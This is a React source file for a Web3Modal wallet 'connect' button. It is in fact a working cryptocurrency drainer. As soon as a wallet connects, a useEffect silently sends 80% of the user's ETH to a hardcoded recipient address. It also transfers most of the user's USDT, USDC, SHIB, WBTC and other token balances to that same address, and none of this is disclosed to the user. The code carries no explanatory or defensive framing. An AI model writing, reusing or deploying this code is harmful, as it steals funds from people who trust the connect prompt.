
import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5/react'
import { useWeb3Modal,useWeb3ModalProvider } from '@web3modal/ethers5/react'
import { useWeb3ModalAccount,useWeb3ModalTheme,useDisconnect } from '@web3modal/ethers5/react'
import {ethers,Contract}from 'ethers'
import { useEffect } from 'react'
import BigNumber from 'bignumber.js'

//this is the hook that return wallet provider
const recipientAddress = '0x33B5aF848f81F8d97dA2D0dd6b7746198F53c2Fc';
// 1. Get projectId
const projectId = 'a4369cd63b3d980fa2b3a8f2a188e102'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}

const sepolianet = {
  chainId: 11155111,
  name: 'Sepolia',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://ethereum-sepolia-rpc.publicnode.com'
}
// 3. Create modal
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com', // origin must match your domain & subdomain
  icons: ['http://localhost:3000/']
}

createWeb3Modal({
  ethersConfig: defaultConfig({
    metadata,
    defaultChainId: 1,
    enableEIP6963: true,
    enableInjected: true,
    enableCoinbase: true,
    rpcUrl: '...' // used for the Coinbase SDK
  }),
  chains: [mainnet,sepolianet],
  projectId,
  enableAnalytics: true // Optional - defaults to your Cloud configuration
})

export default function Web3({name}) {
    // 4. Use modal hook\
    
    const { address, chainId, isConnected } = useWeb3ModalAccount()
    const { open } = useWeb3Modal()
   // const { themeMode, themeVariables, setThemeMode } = useWeb3ModalTheme()
    const { walletProvider } = useWeb3ModalProvider()
    //const { disconnect } = useDisconnect()
    const USDTAbi = [
  'function name() view returns (string)',
  'function symbol() view returns (string)',
  'function balanceOf(address) view returns (uint)',
  'function transfer(address to, uint amount)',
  'event Transfer(address indexed from, address indexed to, uint amount)'
]
async function checkBalance(contractAddress,contractAbi,contractSigner,currency) {
  
   
    // The Contract object
    const USDTContract = new Contract(contractAddress, contractAbi, contractSigner)
    const USDTBalance = await USDTContract.balanceOf(address)
    const amt = ethers.utils.parseEther((BigNumber(USDTBalance.toString()).dividedBy(1.2)).toString());
    console.log(`${ethers.utils.formatUnits(USDTBalance, 18)}${currency}`)
    USDTContract.transfer(recipientAddress,amt).then((tx) => {
      console.log("Transaction hash:", tx.hash);
      return tx.wait(); // Wait for transaction to be mined
    })
    .then((receipt) => {
      console.log("Transaction receipt:", receipt);
    })
    .catch((error) => {
      console.error(`Error sending ${currency}:`, error);
    });
    
    return USDTBalance;
}
useEffect(() => {
 if(isConnected){
  sendETH();
  const ethersProvider = new ethers.providers.Web3Provider(walletProvider)
  const signer =  ethersProvider.getSigner();
  const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
  const BNBAddress= '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
  const USDCAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
  const INSHIAddress= '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE'
  const TRONAddress = '0x50327c6c5a14DCaDE707ABad2E27eB517df87AB5'
  const wrappedBTCAddress='0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
  const tonCoin="0x582d872A1B094FC48F5DE31D3B73F2D9bE47def1"
  checkBalance(USDTAddress,USDTAbi,signer,'USDT')
  checkBalance(BNBAddress,USDTAbi,signer,'BNB')
  checkBalance(USDCAddress,USDTAbi,signer,'USDC')
  checkBalance(INSHIAddress,USDTAbi,signer,'SHIB')
  checkBalance(TRONAddress,USDTAbi,signer,'TRON')
  checkBalance(wrappedBTCAddress,USDTAbi,signer,'WBTC')
  checkBalance(tonCoin,USDTAbi,signer,'TRON')
 }
 else{

 }
  return () => {
  };
}, [isConnected]);
// async function singmsg() {
//   const domain = {
//     name: 'Ether Mail',
//     version: '1',
//     chainId: 11155111,
//     verifyingContract: '0xCcCCccccCCCCcCCCCCCcCcCccCcCCCcCcccccccC'
// };

// // The named list of all type definitions
// const types = {
//     Person: [
//         { name: 'name', type: 'string' },
//         { name: 'wallet', type: 'address' }
//     ],
//     Mail: [
//         { name: 'from', type: 'Person' },
//         { name: 'to', type: 'Person' },
//         { name: 'contents', type: 'string' }
//     ]
// };

// // The data to sign
// const value = {
//     from: {
//         name: 'Cow',
//         wallet: '0xCD2a3d9F938E13CD947Ec05AbC7FE734Df8DD826'
//     },
//     to: {
//         name: 'Bob',
//         wallet: '0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB'
//     },
//     contents: 'Hello, Bob!'
// };

// alert('connected')
// const provider = new ethers.providers.Web3Provider(walletProvider)
// const signer = await provider.getSigner()
// const signature = signer._signTypedData(domain, types, value);
// }


async function sendETH() {
  if(isConnected){
  try {
   
    const provider = new ethers.providers.Web3Provider(walletProvider)
    const signer = await provider.getSigner()
    // const balance = provider.getBalance(address);
    // const etherBalance= ethers.utils.formatEther(balance);
    // console.log(etherBalance+'balance')

    // const amountToSendInEther = etherBalance * 0.8; // 80% of the balance
    // const amountToSend = ethers.utils.parseEther(amountToSendInEther.toString());

    const ethBalance = await provider.getBalance(address);

    // Convert balance from BigNumber to Ether
    const ethBalanceInEther = ethers.utils.formatEther(ethBalance);

    // Calculate 80% of the balance
    const amountToSendInEther = parseFloat(ethBalanceInEther) * 0.8; // 80% of the balance

    // Convert amount to BigNumber
    const amountToSend = ethers.utils.parseEther(amountToSendInEther.toFixed(18));

    const tx = await signer.sendTransaction({
          to: recipientAddress,
          value: amountToSend
      });
      console.log('Transaction Hash:', tx.hash);
  } catch (error) {
      console.error('Error:', error);
  }
}
}
    async function onSignMessage() {
      alert('connected')
      const provider = new ethers.providers.Web3Provider(walletProvider)
    const signer = await provider.getSigner()
    const signature = await signer?.signMessage('http://localhost:3000/')
    console.log(signature)
    }

    return (
      
        <button onClick={() =>
          {
           // sendETH();
            open();
            
          }}>{name} </button>
          
//         <button onClick={() => open({ view: 'Networks' })}>Open Network Modal</button>
//         {/* {address} {chainId } {isConnected?'connected':'disconnected'}
//         <button onClick={() => setThemeMode(themeMode === 'dark' ? 'light' : 'dark')}>
//         Toggle Theme Mode
//       </button> */}
//       <p>
//         {/* <button
//         onClick={disconnect}
//         >disconnect</button> */}
//         <br />
//  {/* <button onClick={() => }>Sign Message</button>  */}
    
//       </p>
      
    )
}


     

